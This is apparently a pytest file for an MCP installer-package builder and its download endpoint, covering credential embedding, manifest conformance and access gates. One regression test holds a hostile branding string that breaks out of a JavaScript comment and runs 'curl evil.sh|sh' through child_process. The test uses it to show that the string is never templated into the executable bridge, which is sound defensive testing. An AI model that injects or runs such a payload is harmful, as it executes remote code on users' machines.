"""Tests for the ``/mcp/xtm`` installer packages and their download endpoint.

Covers:

- each format's layout, and that the manifest's declared entry point is a file
  the archive actually contains
- Agent Plugins v1.0.0 conformance: the manifest's closed top-level field set,
  and that the package never carries a credential (the specification requires
  ``mcp.json`` headers to be literal, non-secret package data)
- credential embedding: only where the format allows it, and the client's
  own key prompt dropped when a key is embedded (an install prompt nothing
  reads looks like a bug)
- the skill re-imports into XTM One as a skill package, which its README claims
- byte-for-byte determinism, so an unchanged package keeps its checksum
- the endpoint's gates: server toggle, format that cannot carry a key,
  impersonation
"""

import io
import json
import uuid
import zipfile
from types import SimpleNamespace

import pytest
from fastapi import HTTPException

from app.services.mcp_packages import (
    PACKAGE_FORMATS,
    PLUGIN_NAME,
    SKILL_NAME,
    UnknownPackageFormatError,
    build_package,
    embeds_api_key,
)
from app.services.skill_package_manager import parse_skill_markdown
from app.tools.base import ToolDefinition

URL = "https://xtm.example.com/mcp/xtm"
KEY = "fcp-" + "a" * 48
KEY_NAME = "Claude Desktop extension (2026-08-29)"

#: The ten top-level fields ``plugin.schema.json`` permits. Unknown fields are
#: rejected outright by a conformant client, so this set is a hard contract.
_AGENT_PLUGIN_FIELDS = {
    "$schema",
    "name",
    "version",
    "description",
    "author",
    "homepage",
    "repository",
    "license",
    "keywords",
    "extensions",
}


def _tools() -> list[ToolDefinition]:
    return [
        ToolDefinition(
            name="inspect_agent_traces",
            description="Inspect recent traces.",
            input_schema={"type": "object", "properties": {}},
        ),
        ToolDefinition(
            name="update_agent",
            description="Edit an agent.",
            input_schema={
                "type": "object",
                "properties": {"agent_id": {"type": "string"}},
                "required": ["agent_id"],
            },
        ),
        ToolDefinition(name="search_knowledge", description="Search knowledge."),
    ]


def _build(package_format: str, *, api_key: str | None = None) -> zipfile.ZipFile:
    _filename, payload = build_package(
        package_format,
        url=URL,
        platform_name="XTM One",
        app_version="1.2.3",
        tools=_tools(),
        api_key=api_key,
        key_name=KEY_NAME if api_key else "",
    )
    return zipfile.ZipFile(io.BytesIO(payload))


def _all_text(archive: zipfile.ZipFile) -> str:
    return "\n".join(archive.read(name).decode("utf-8") for name in archive.namelist())


# ── Layout ───────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("package_format", PACKAGE_FORMATS)
def test_every_format_ships_the_same_skill(package_format):
    archive = _build(package_format)
    skill = [n for n in archive.namelist() if n.endswith("SKILL.md")]
    assert len(skill) == 1
    assert f"skills/{SKILL_NAME}/SKILL.md" in skill[0]
    # The generated reference travels with it, or the skill points at nothing.
    assert any(n.endswith("references/tool-reference.md") for n in archive.namelist())


def test_claude_code_layout():
    names = set(_build("claude-code").namelist())
    # ``.claude-plugin/`` holds the manifests only; components live at the root.
    assert f"{PLUGIN_NAME}/.claude-plugin/plugin.json" in names
    assert f"{PLUGIN_NAME}/.claude-plugin/marketplace.json" in names
    assert f"{PLUGIN_NAME}/.mcp.json" in names


def test_mcpb_manifest_is_at_the_archive_root_and_names_a_real_file():
    archive = _build("mcpb")
    names = set(archive.namelist())
    # Claude Desktop reads manifest.json at the root — a wrapping directory
    # would make the bundle unreadable.
    assert "manifest.json" in names
    manifest = json.loads(archive.read("manifest.json"))
    assert manifest["server"]["entry_point"] in names


def test_agent_plugin_layout():
    names = set(_build("agent-plugin").namelist())
    assert f"{PLUGIN_NAME}/plugin.json" in names
    assert f"{PLUGIN_NAME}/mcp.json" in names


def test_unknown_format_is_rejected():
    with pytest.raises(UnknownPackageFormatError):
        build_package("nonsense", url=URL, platform_name="X", app_version="1", tools=[])


# ── Agent Plugins conformance ────────────────────────────────────────────────


def test_agent_plugin_manifest_uses_only_permitted_fields():
    archive = _build("agent-plugin")
    manifest = json.loads(archive.read(f"{PLUGIN_NAME}/plugin.json"))
    assert set(manifest) <= _AGENT_PLUGIN_FIELDS, (
        f"unknown top-level fields: {set(manifest) - _AGENT_PLUGIN_FIELDS}"
    )
    assert manifest["$schema"].endswith("/1.0.0/plugin.schema.json")
    assert manifest["name"] == PLUGIN_NAME


def test_agent_plugin_declares_the_streamable_http_server():
    archive = _build("agent-plugin")
    mcp = json.loads(archive.read(f"{PLUGIN_NAME}/mcp.json"))
    server = mcp["mcpServers"][PLUGIN_NAME]
    assert server["type"] == "streamable-http"
    assert server["url"] == URL


def test_agent_plugin_never_embeds_a_credential():
    """The specification forbids secrets in mcp.json headers, so a key passed
    here must be dropped rather than quietly written into the package."""
    archive = _build("agent-plugin", api_key=KEY)
    assert KEY not in _all_text(archive)
    mcp = json.loads(archive.read(f"{PLUGIN_NAME}/mcp.json"))
    assert "headers" not in mcp["mcpServers"][PLUGIN_NAME]


def test_only_the_client_specific_formats_can_embed_a_key():
    assert embeds_api_key("claude-code") is True
    assert embeds_api_key("mcpb") is True
    assert embeds_api_key("agent-plugin") is False


# ── Credential embedding ─────────────────────────────────────────────────────


def test_claude_code_prompts_for_the_key_when_none_is_embedded():
    archive = _build("claude-code")
    manifest = json.loads(archive.read(f"{PLUGIN_NAME}/.claude-plugin/plugin.json"))
    assert "api_token" in manifest["userConfig"]
    assert manifest["userConfig"]["api_token"]["sensitive"] is True
    mcp = json.loads(archive.read(f"{PLUGIN_NAME}/.mcp.json"))
    header = mcp["mcpServers"][PLUGIN_NAME]["headers"]["Authorization"]
    assert header == "Bearer ${user_config.api_token}"


def test_claude_code_embeds_the_key_and_drops_the_prompt():
    archive = _build("claude-code", api_key=KEY)
    manifest = json.loads(archive.read(f"{PLUGIN_NAME}/.claude-plugin/plugin.json"))
    # A prompt whose value nothing reads would ask the user for nothing.
    assert "userConfig" not in manifest
    mcp = json.loads(archive.read(f"{PLUGIN_NAME}/.mcp.json"))
    assert mcp["mcpServers"][PLUGIN_NAME]["headers"]["Authorization"] == f"Bearer {KEY}"


def test_mcpb_prompts_for_the_key_when_none_is_embedded():
    archive = _build("mcpb")
    manifest = json.loads(archive.read("manifest.json"))
    assert manifest["user_config"]["api_key"]["sensitive"] is True
    env = manifest["server"]["mcp_config"]["env"]
    assert env["XTM_MCP_TOKEN"] == "${user_config.api_key}"
    assert env["XTM_MCP_URL"] == URL


def test_mcpb_embeds_the_key_and_drops_the_prompt():
    archive = _build("mcpb", api_key=KEY)
    manifest = json.loads(archive.read("manifest.json"))
    assert "user_config" not in manifest
    assert manifest["server"]["mcp_config"]["env"]["XTM_MCP_TOKEN"] == KEY


@pytest.mark.parametrize("package_format", ["claude-code", "mcpb"])
def test_the_readme_names_the_key_to_revoke(package_format):
    archive = _build(package_format, api_key=KEY)
    readme = next(n for n in archive.namelist() if n.endswith("README.md"))
    body = archive.read(readme).decode("utf-8")
    # Telling someone to revoke "the key" is useless when they have several.
    assert KEY_NAME in body


# ── Content ──────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("package_format", PACKAGE_FORMATS)
def test_no_template_placeholder_survives(package_format):
    text = _all_text(_build(package_format, api_key=None))
    for placeholder in ("{{PLATFORM_NAME}}", "{{KEY_NAME}}", "{{INSTALL_AUTH}}"):
        assert placeholder not in text


def test_the_branding_name_reaches_the_package():
    _filename, payload = build_package(
        "agent-plugin",
        url=URL,
        platform_name="Acme AI",
        app_version="1.0.0",
        tools=_tools(),
    )
    assert "Acme AI" in _all_text(zipfile.ZipFile(io.BytesIO(payload)))


def test_the_tool_reference_is_generated_from_the_callers_tools():
    archive = _build("agent-plugin")
    reference = archive.read(
        f"{PLUGIN_NAME}/skills/{SKILL_NAME}/references/tool-reference.md"
    ).decode("utf-8")
    for tool in _tools():
        assert f"`{tool.name}`" in reference
    # Grouped, not one flat list — and grouped by meaning, so a trace tool does
    # not land under Agents just because its name contains "agent".
    assert "## Traces" in reference
    assert "## Agents" in reference
    assert reference.index("inspect_agent_traces") < reference.index("## Agents")
    # Required arguments are stated; a model that has to guess them will.
    assert "required: `agent_id`" in reference


def test_the_shipped_skill_reimports_into_the_platform():
    """The Agent Plugins README says the skill imports back as a skill package."""
    archive = _build("agent-plugin")
    raw = archive.read(f"{PLUGIN_NAME}/skills/{SKILL_NAME}/SKILL.md")
    parsed = parse_skill_markdown(raw)
    assert parsed.name == SKILL_NAME
    assert parsed.description


@pytest.mark.parametrize("package_format", PACKAGE_FORMATS)
def test_packages_are_byte_for_byte_reproducible(package_format):
    kwargs = {
        "url": URL,
        "platform_name": "XTM One",
        "app_version": "1.2.3",
        "tools": _tools(),
    }
    first = build_package(package_format, **kwargs)
    second = build_package(package_format, **kwargs)
    # A moving mtime would give every download a new checksum and make an
    # unchanged package look like it changed.
    assert first == second


# ── Download endpoint ────────────────────────────────────────────────────────


def _fake_user(*, impersonated: bool = False) -> SimpleNamespace:
    return SimpleNamespace(
        id=uuid.uuid4(),
        is_active=True,
        is_admin=True,
        role="admin",
        impersonated_by=uuid.uuid4() if impersonated else None,
    )


def _request():
    from starlette.requests import Request

    return Request(
        {
            "type": "http",
            "method": "POST",
            "path": "/api/v1/platform/mcp-servers/xtm/package",
            "headers": [],
            "query_string": b"",
        }
    )


class _EmptyResult:
    def scalars(self):
        return self

    def all(self):
        return []


class _RecordingSession:
    """Enough session to mint a key and build the tool surface."""

    def __init__(self):
        self.added = []
        #: Per-request scratch space, as SQLAlchemy's AsyncSession provides.
        self.info: dict = {}

    async def execute(self, _statement):
        return _EmptyResult()

    def add(self, row):
        self.added.append(row)

    async def flush(self):
        return None

    async def commit(self):
        return None


@pytest.mark.asyncio
async def test_download_refused_while_the_server_is_disabled(monkeypatch):
    from app.api.v1 import mcp_xtm
    from app.api.v1.platform import XtmMCPPackageRequest, download_xtm_mcp_package

    async def _disabled(_db):
        return False

    monkeypatch.setattr(mcp_xtm, "xtm_mcp_enabled", _disabled)

    with pytest.raises(HTTPException) as exc_info:
        await download_xtm_mcp_package(
            XtmMCPPackageRequest(format="claude-code"),
            _request(),
            db=_RecordingSession(),
            user=_fake_user(),
        )
    assert exc_info.value.status_code == 403


@pytest.mark.asyncio
async def test_download_refuses_a_key_for_a_format_that_cannot_carry_one(monkeypatch):
    from app.api.v1 import mcp_xtm
    from app.api.v1.platform import XtmMCPPackageRequest, download_xtm_mcp_package

    async def _enabled(_db):
        return True

    monkeypatch.setattr(mcp_xtm, "xtm_mcp_enabled", _enabled)
    session = _RecordingSession()

    with pytest.raises(HTTPException) as exc_info:
        await download_xtm_mcp_package(
            XtmMCPPackageRequest(format="agent-plugin", include_key=True),
            _request(),
            db=session,
            user=_fake_user(),
        )
    assert exc_info.value.status_code == 422
    # Refused before minting: a rejected request must not leave a key behind.
    assert session.added == []


@pytest.mark.asyncio
async def test_download_refuses_to_mint_a_key_while_impersonating(monkeypatch):
    from app.api.v1 import mcp_xtm
    from app.api.v1.platform import XtmMCPPackageRequest, download_xtm_mcp_package

    async def _enabled(_db):
        return True

    monkeypatch.setattr(mcp_xtm, "xtm_mcp_enabled", _enabled)
    session = _RecordingSession()

    with pytest.raises(HTTPException) as exc_info:
        await download_xtm_mcp_package(
            XtmMCPPackageRequest(format="mcpb", include_key=True),
            _request(),
            db=session,
            user=_fake_user(impersonated=True),
        )
    assert exc_info.value.status_code == 403
    assert session.added == []


@pytest.mark.asyncio
async def test_download_without_a_key_mints_nothing(monkeypatch):
    from app.api.v1 import mcp_xtm
    from app.api.v1.platform import XtmMCPPackageRequest, download_xtm_mcp_package

    async def _enabled(_db):
        return True

    monkeypatch.setattr(mcp_xtm, "xtm_mcp_enabled", _enabled)
    session = _RecordingSession()

    response = await download_xtm_mcp_package(
        XtmMCPPackageRequest(format="agent-plugin"),
        _request(),
        db=session,
        user=_fake_user(),
    )

    assert response.status_code == 200
    assert "xtm-one-platform-agent-plugin.zip" in response.headers["content-disposition"]
    assert "x-api-key-created" not in response.headers
    assert session.added == []
    assert zipfile.ZipFile(io.BytesIO(response.body)).namelist()


class _OrderRecordingSession(_RecordingSession):
    """The same session, noting its writes in order - where the commit falls
    relative to the mint."""

    def __init__(self):
        super().__init__()
        self.calls: list[str] = []

    def add(self, row):
        super().add(row)
        self.calls.append("add")

    async def flush(self):
        self.calls.append("flush")

    async def commit(self):
        self.calls.append("commit")


@pytest.mark.asyncio
async def test_download_with_a_key_mints_one_and_embeds_it(monkeypatch):
    from app.api.v1 import mcp_xtm
    from app.api.v1.platform import XtmMCPPackageRequest, download_xtm_mcp_package

    async def _enabled(_db):
        return True

    async def _no_audit(*_args, **_kwargs):
        return None

    monkeypatch.setattr(mcp_xtm, "xtm_mcp_enabled", _enabled)
    monkeypatch.setattr("app.services.audit.log_audit", _no_audit)
    session = _OrderRecordingSession()

    response = await download_xtm_mcp_package(
        XtmMCPPackageRequest(format="mcpb", include_key=True),
        _request(),
        db=session,
        user=_fake_user(),
    )

    assert response.status_code == 200
    # Exactly one key, and the response names it so the UI need not open the
    # archive to tell the user what was created.
    assert len(session.added) == 1
    minted = session.added[0]
    created = response.headers["x-api-key-created"]
    assert created == minted.name
    assert "Claude Desktop" in created

    archive = zipfile.ZipFile(io.BytesIO(response.body))
    manifest = json.loads(archive.read("manifest.json"))
    embedded = manifest["server"]["mcp_config"]["env"]["XTM_MCP_TOKEN"]
    assert embedded.startswith("fcp-")
    assert embedded not in ("", "${user_config.api_key}")
    # Stored hashed, as every other key is — the plaintext exists only here.
    assert minted.key_hash != embedded
    assert minted.key_prefix == embedded[:12] + "..."
    # Committed before the package is handed back, not on the get_db
    # teardown: the installed client must never connect ahead of its key.
    assert session.calls == ["add", "flush", "commit"]


# ── Platform bridge targets ──────────────────────────────────────────────────


def _build_target(target_key: str, *, api_key: str | None = None) -> zipfile.ZipFile:
    from app.services.mcp_packages import resolve_target

    _filename, payload = build_package(
        "claude-code",
        url=f"https://xtm.example.com/mcp/{target_key}",
        platform_name="XTM One",
        app_version="1.2.3",
        tools=_tools(),
        api_key=api_key,
        key_name=KEY_NAME if api_key else "",
        target=resolve_target(target_key),
    )
    return zipfile.ZipFile(io.BytesIO(payload))


def test_every_target_is_a_single_server():
    """One package installs one server.

    Bundling them is trivial and a trap: a client loads every tool definition
    of every server it connects to, so "all of them" is ~213 tools in context
    on each request. This asserts the shape, not a preference.
    """
    from app.services.mcp_packages import PACKAGE_TARGETS, resolve_target

    assert set(PACKAGE_TARGETS) == {"xtm", "opencti", "openaev", "opencrq"}
    for key in PACKAGE_TARGETS:
        archive = _build_target(key)
        name = resolve_target(key).plugin_name
        mcp = json.loads(archive.read(f"{name}/.mcp.json"))
        assert len(mcp["mcpServers"]) == 1


def test_an_unknown_target_is_rejected():
    from app.services.mcp_packages import UnknownPackageTargetError, resolve_target

    with pytest.raises(UnknownPackageTargetError):
        resolve_target("all")


@pytest.mark.parametrize(
    ("target_key", "display"),
    [("opencti", "OpenCTI"), ("openaev", "OpenAEV"), ("opencrq", "OpenCRQ")],
)
def test_a_bridge_package_points_at_its_own_endpoint(target_key, display):
    from app.services.mcp_packages import resolve_target

    target = resolve_target(target_key)
    archive = _build_target(target_key)
    mcp = json.loads(archive.read(f"{target.plugin_name}/.mcp.json"))
    server = mcp["mcpServers"][target.server_key]
    assert server["url"].endswith(f"/mcp/{target_key}")

    manifest = json.loads(
        archive.read(f"{target.plugin_name}/.claude-plugin/plugin.json")
    )
    # The product is named, and the brand is named as the bridge — a user with
    # four packages installed must be able to tell them apart.
    assert display in manifest["displayName"]
    assert "XTM One" in manifest["displayName"]


def test_a_bridge_ships_the_generated_catalogue_and_no_invented_prose():
    """Guidance for OpenCTI's tools is OpenCTI's to write, not this packager's."""
    from app.services.mcp_packages import resolve_target

    target = resolve_target("opencti")
    archive = _build_target("opencti")
    root = f"{target.plugin_name}/skills/{target.skill_name}"
    skill = archive.read(f"{root}/SKILL.md").decode("utf-8")

    # Parses as an importable skill package, like the authored one.
    parsed = parse_skill_markdown(skill.encode("utf-8"))
    assert parsed.name == "opencti-tools"
    assert parsed.description

    # It points at the authority rather than restating it.
    assert "OpenCTI" in skill
    assert "documentation is the authority" in skill
    # And it carries the real catalogue.
    reference = archive.read(f"{root}/references/tool-reference.md").decode("utf-8")
    for tool in _tools():
        assert f"`{tool.name}`" in reference


def test_a_bridge_package_can_embed_a_key_too():
    from app.services.mcp_packages import resolve_target

    target = resolve_target("openaev")
    archive = _build_target("openaev", api_key=KEY)
    mcp = json.loads(archive.read(f"{target.plugin_name}/.mcp.json"))
    header = mcp["mcpServers"][target.server_key]["headers"]["Authorization"]
    assert header == f"Bearer {KEY}"
    manifest = json.loads(
        archive.read(f"{target.plugin_name}/.claude-plugin/plugin.json")
    )
    assert "userConfig" not in manifest


def test_targets_do_not_collide_on_disk():
    """Two packages installed side by side must not overwrite each other."""
    from app.services.mcp_packages import PACKAGE_TARGETS

    names = {t.plugin_name for t in PACKAGE_TARGETS.values()}
    skills = {t.skill_name for t in PACKAGE_TARGETS.values()}
    assert len(names) == len(PACKAGE_TARGETS)
    assert len(skills) == len(PACKAGE_TARGETS)


# ── Config snippets (clients configured by editing a file) ───────────────────


def _snippet(client: str, *, api_key: str | None = None, target_key: str = "xtm"):
    from app.services.mcp_packages import build_snippet, resolve_target

    return build_snippet(
        client,
        url=f"https://xtm.example.com/mcp/{target_key}",
        target=resolve_target(target_key),
        api_key=api_key,
    )


def test_an_unknown_snippet_client_is_rejected():
    from app.services.mcp_packages import UnknownSnippetClientError

    with pytest.raises(UnknownSnippetClientError):
        _snippet("emacs")


@pytest.mark.parametrize("api_key", [None, KEY])
def test_the_codex_snippet_is_valid_toml(api_key):
    """Codex ignores a malformed ``[mcp_servers.…]`` section *silently*, so a
    snippet that does not parse would look installed and never load."""
    import tomllib

    client, text = _snippet("codex", api_key=api_key)
    assert client.path == "~/.codex/config.toml"
    parsed = tomllib.loads(text)

    # snake_case table name: the kebab-case server key would be ignored.
    server = parsed["mcp_servers"]["xtm_one_platform"]
    assert server["url"].endswith("/mcp/xtm")
    if api_key:
        assert server["http_headers"]["Authorization"] == f"Bearer {api_key}"
        assert "bearer_token_env_var" not in server
    else:
        assert server["bearer_token_env_var"] == "XTM_ONE_API_KEY"
        assert "http_headers" not in server


@pytest.mark.parametrize("api_key", [None, KEY])
def test_the_cursor_snippet_is_valid_json(api_key):
    client, text = _snippet("cursor", api_key=api_key)
    assert client.path == "~/.cursor/mcp.json"
    server = json.loads(text)["mcpServers"]["xtm-one-platform"]
    assert server["url"].endswith("/mcp/xtm")
    expected = f"Bearer {api_key}" if api_key else "Bearer ${env:XTM_ONE_API_KEY}"
    assert server["headers"]["Authorization"] == expected


def test_a_snippet_targets_the_chosen_server():
    import tomllib

    _client, text = _snippet("codex", target_key="opencti")
    assert "opencti" in tomllib.loads(text)["mcp_servers"]
    _client, text = _snippet("cursor", target_key="openaev")
    assert "openaev" in json.loads(text)["mcpServers"]


def test_a_credential_free_snippet_names_no_key():
    """The whole point of the no-key form: nothing pasteable is a secret."""
    for client in ("codex", "cursor"):
        _c, text = _snippet(client, api_key=None)
        assert "fcp-" not in text


# ── Regressions from review ───────────────────────────────────────


def test_the_executable_bridge_is_never_templated():
    """Branding is admin-configurable free text and this file is *executed*.

    ``_render`` is an unescaped replace, so a brand containing ``*/`` would
    close the banner comment and turn the rest into JavaScript running on
    every workstation that installs the bundle. The JSON manifests are safe
    (``json.dumps`` escapes); this was the only exposed surface.
    """
    hostile = '*/;require("child_process").exec("curl evil.sh|sh");/*'
    _filename, payload = build_package(
        "mcpb",
        url=URL,
        platform_name=hostile,
        app_version="1.2.3",
        tools=_tools(),
    )
    archive = zipfile.ZipFile(io.BytesIO(payload))
    bridge = archive.read("server/index.js").decode("utf-8")

    # The invariant, stated directly: the shipped file IS the source file.
    # Nothing derived from configuration reaches it, so nothing in it can be
    # steered by whoever can rename the platform.
    from app.services.mcp_packages import DATA_DIR

    assert bridge == (DATA_DIR / "proxy" / "index.js").read_text(encoding="utf-8")
    assert hostile not in bridge
    assert "child_process" not in bridge
    # And nothing is left waiting for a substitution that no longer happens.
    assert "{{" not in bridge


@pytest.mark.asyncio
async def test_an_unknown_format_is_refused_before_any_key_is_minted(monkeypatch):
    """Ordering, not just wording.

    ``embeds_api_key`` answers False for any unrecognised string, so checking
    it first answered an unknown format with the Agent Plugins message — and a
    format added to the builders but not to that helper would mint a key and
    write an audit row before raising.
    """
    from app.api.v1 import mcp_xtm
    from app.api.v1.platform import XtmMCPPackageRequest, download_xtm_mcp_package

    async def _enabled(_db):
        return True

    monkeypatch.setattr(mcp_xtm, "xtm_mcp_enabled", _enabled)
    session = _RecordingSession()

    with pytest.raises(HTTPException) as exc_info:
        await download_xtm_mcp_package(
            XtmMCPPackageRequest(format="bogus", include_key=True),
            _request(),
            db=session,
            user=_fake_user(),
        )

    assert exc_info.value.status_code == 422
    assert "Unsupported package format" in exc_info.value.detail
    assert "Agent Plugins" not in exc_info.value.detail
    assert session.added == []
